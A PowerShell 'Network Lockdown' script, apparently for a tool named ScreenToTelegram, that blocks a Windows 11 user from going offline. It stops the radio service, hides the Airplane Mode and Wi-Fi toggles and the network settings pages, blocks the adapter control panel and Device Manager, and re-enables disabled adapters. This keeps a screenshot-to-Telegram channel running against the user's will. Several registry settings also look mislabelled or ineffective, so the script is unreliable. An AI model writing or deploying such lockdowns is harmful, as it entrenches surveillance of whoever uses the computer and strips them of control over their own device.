<#
.SYNOPSIS
    Network Lockdown for ScreenToTelegram - Windows 11
    Blocks all common ways a user can manually disconnect the internet.
    Must be run as ADMINISTRATOR.
    Run Unlock-Network.ps1 to reverse all changes.
#>

#Requires -RunAsAdministrator
$ErrorActionPreference = 'SilentlyContinue'

function Ensure-Key([string]$Path) {
    if (-not (Test-Path $Path)) { New-Item -Path $Path -Force | Out-Null }
}
function Set-Reg([string]$Path, [string]$Name, $Value, [string]$Type = 'DWord') {
    Ensure-Key $Path
    Set-ItemProperty -Path $Path -Name $Name -Value $Value -Type $Type -Force
}
function W([string]$msg, [string]$c = 'Cyan') { Write-Host "  [+] $msg" -ForegroundColor $c }
function S([string]$t) { Write-Host ""; Write-Host ("- " * 30) -ForegroundColor DarkGray; Write-Host "  $t" -ForegroundColor Yellow }

$backupFile = Join-Path $PSScriptRoot "network_lockdown_backup.json"
$backup = @{}

Write-Host ""
Write-Host "  Network Lockdown - ScreenToTelegram" -ForegroundColor Red
Write-Host ""

# ── 1. AIRPLANE MODE ─────────────────────────────────────────────
S "1. Airplane Mode"
$backup["RmSvc_Start"] = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\RmSvc" -Name Start -ErrorAction SilentlyContinue).Start
Set-Reg "HKLM:\SYSTEM\CurrentControlSet\Services\RmSvc" "Start" 4
try { Stop-Service -Name "RmSvc" -Force; W "RadioManagement service stopped + disabled" }
catch { W "RmSvc: $($_.Exception.Message)" Yellow }

# Force radio ON
Set-Reg "HKLM:\SYSTEM\CurrentControlSet\Control\RadioManagement\SystemRadioState" "(default)" 0

# Hide Airplane Mode from Action Center
$qaBase = "HKCU:\Control Panel\Quick Actions\Control Center"
Set-Reg "$qaBase\SystemSettings_Device_AirplaneMode_SliderButton" "IsEnabled" 0
W "Airplane Mode hidden from Action Center"

# ── 2. WI-FI TOGGLE ──────────────────────────────────────────────
S "2. Wi-Fi Toggle"
Set-Reg "$qaBase\SystemSettings_Network_WiFi_QuickAction" "IsEnabled" 0
W "Wi-Fi Quick Action button hidden"

# ── 3. SETTINGS PAGES ────────────────────────────────────────────
S "3. Network Settings Pages"
$hidePagesHKLM = "hide:network-wifi;network-airplanemode;network-vpn;network-proxy;network-ethernet;network-mobilehotspot;network-dialup;network-directaccess"
$hidePagesHKCU = "hide:network;network-wifi;network-airplanemode;network-vpn;network-proxy;network-ethernet;network-mobilehotspot;network-dialup"

Set-Reg "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" "SettingsPageVisibility" $hidePagesHKLM String
Set-Reg "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" "SettingsPageVisibility" $hidePagesHKCU String
W "All Network & Internet settings pages hidden"

# ── 4. NCPA.CPL — disable adapter right-click ────────────────────
S "4. Network Connections (ncpa.cpl)"
$ncKeys = @(
    "HKCU:\Software\Policies\Microsoft\Windows\Network Connections",
    "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Network Connections"
)
foreach ($nc in $ncKeys) {
    Set-Reg $nc "NC_DisableNetworkType"  1   # block enable/disable adapters
    Set-Reg $nc "NC_EnableAdminProhibits" 1  # block right-click properties
    Set-Reg $nc "NC_AllowNetBridge_NLA"  0   # block bridging
    Set-Reg $nc "NC_StatsEnabled"         0   # hide connection stats
}
Set-Reg "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" "NoNetworkConnections" 1
W "ncpa.cpl access blocked + adapter right-click disabled"

# ── 5. DEVICE MANAGER (MMC snapin block) ─────────────────────────
S "5. Device Manager"
$mmc = "HKCU:\Software\Policies\Microsoft\MMC"
Set-Reg $mmc "RestrictToPermittedSnapins" 1
# Device Manager GUID: {74246bfc-4c96-11d0-abef-0020af6b0b7a}
Set-Reg "HKCU:\Software\Policies\Microsoft\MMC\{74246bfc-4c96-11d0-abef-0020af6b0b7a}" "Restrict_Run" 1
W "Device Manager MMC snapin blocked"

# ── 6. TASKBAR NETWORK FLYOUT ────────────────────────────────────
S "6. Taskbar Network Icon Flyout"
# Prevent taskbar from showing network flyout options
Set-Reg "HKCU:\Software\Policies\Microsoft\Windows\NetworkConnectStatusIndicator" "NoActiveProbe" 0
# Disable the network icon showing disconnected options
Set-Reg "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Managed" "DefaultNameServers" "" String
W "Network flyout restrictions applied"

# ── 7. FORCE RE-ENABLE ALL ADAPTERS NOW ──────────────────────────
S "7. Force Re-Enable All Adapters"
try {
    $disabled = Get-NetAdapter | Where-Object { $_.Status -eq 'Disabled' }
    if ($disabled) {
        $disabled | Enable-NetAdapter -Confirm:$false
        $disabled | ForEach-Object { W "Re-enabled: $($_.Name)" Green }
    } else { W "All adapters already enabled" Green }
} catch { W "Could not check adapters: $($_.Exception.Message)" Yellow }

# ── 8. SAVE BACKUP ───────────────────────────────────────────────
$backup | ConvertTo-Json | Set-Content -Path $backupFile -Encoding UTF8
W "Backup saved to: $backupFile" DarkGray

# ── REFRESH ──────────────────────────────────────────────────────
try { & gpupdate.exe /force /quiet 2>$null | Out-Null; W "Group Policy refreshed" Green }
catch {}

Write-Host ""
$ans = Read-Host "  Restart Explorer to apply Action Center changes? (y/n) [y]"
if ($ans -ne 'n') {
    Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1; Start-Process explorer
    W "Explorer restarted" Green
}

Write-Host ""
Write-Host "  DONE. Run Unlock-Network.ps1 as Admin to reverse." -ForegroundColor Green
Write-Host ""
